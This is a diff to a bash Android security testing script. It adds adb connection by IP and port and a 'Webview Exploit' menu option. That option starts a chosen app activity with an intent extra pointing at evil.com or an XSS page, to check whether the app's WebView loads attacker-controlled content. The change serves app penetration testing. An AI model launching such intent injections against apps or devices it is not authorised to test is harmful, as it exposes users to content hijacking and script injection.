@@ -1,11 +1,25 @@
 #!/bin/bash
 
+# Connect to your android
+if [ $# -eq 1 ]; then
+    if [[ $1 =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+:[0-9]+$ ]]; then
+        adb connect "$1"
+        exit 0
+    else
+        echo "Invalid IP:PORT format. Usage: $0 <IP>:<PORT>"
+        exit 1
+    fi
+fi
+
 # Check if an Android device is connected using ADB
 device_status=$(adb get-state)
 if [ "$device_status" != "device" ]; then
-    echo "Connect your android device"
+    echo "Connect to your android device"
+    echo "Usage: $0 <IP>:<PORT>"
     exit 1
 fi
+
+
 
 # Containers
 model=$(adb shell getprop ro.product.model)
@@ -15,7 +29,7 @@ path="/Users/mdnahidalam/Desktop/android_security/target/" # Set your path
 function banner(){
     clear
     echo -e "\033[0;32m"
-    echo "⣿⣿⣿⣿⣿⣿⣧⠻⣿⣿⠿⠿⠿⢿⣿⠟⣼⣿⣿⣿⣿⣿⣿ v1.0"
+    echo "⣿⣿⣿⣿⣿⣿⣧⠻⣿⣿⠿⠿⠿⢿⣿⠟⣼⣿⣿⣿⣿⣿⣿ v1.1"
     echo "⣿⣿⣿⣿⣿⣿⠟⠃⠁⠀⠀⠀⠀⠀⠀⠘⠻⣿⣿⣿⣿⣿⣿"
     echo "⣿⣿⣿⣿⡿⠃⠀⣴⡄⠀⠀⠀⠀⠀⣴⡆⠀⠘⢿⣿⣿⣿⣿"
     echo "⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⣿"
@@ -41,8 +55,9 @@ function menu(){
     echo -e "\033[0;37m5. \033[0;32mDecompile APK [Apktool]"
     echo -e "\033[0;37m6. \033[0;32mRun Activity"
     echo -e "\033[0;37m7. \033[0;32mShow Exploitable Activity"
+    echo -e "\033[0;37m8. \033[0;32mWebview Exploit"
     echo -e "\n\033[0;37m(connect)      (disconnect)"
-    echo -e "\n\033[0;33mInstall requirements for:"
+    echo -e "\n\033[0;33mInstall Requerments for:"
     echo -e "$> Mac"
     echo "$> Linux"
     echo -e "\033[0;32m"
@@ -124,6 +139,25 @@ while true; do
                 echo -e "\033[0;32mActivity name: \033[0;35m$activity \033[0;31m[True]"
             fi
         done <<< "$grep_result"
+        echo -e " "
+        read -p "Press ENTER to Clear" enter
+  
+  # webview exploit
+    elif [ "$input" == "8" ]; then
+        banner
+        read -p "[$model] activity name> " activity_name
+        read -p "[$model] string name> " string
+        echo -e "Choice: 1) evil.com   2) XSS"
+        read -p "[$model] website option> " website_option
+
+        if [ "$website_option" == "1" ]; then
+            website="https://evil.com"
+        elif [ "$website_option" == "2" ]; then
+            website="https://nahid0x1.github.io/xss.html"
+        else
+            echo "Wrong Option"
+        fi
+        adb shell am start -n "$activity_name" --es "$string" "$website"
         echo -e " "
         read -p "Press ENTER to Clear" enter
 
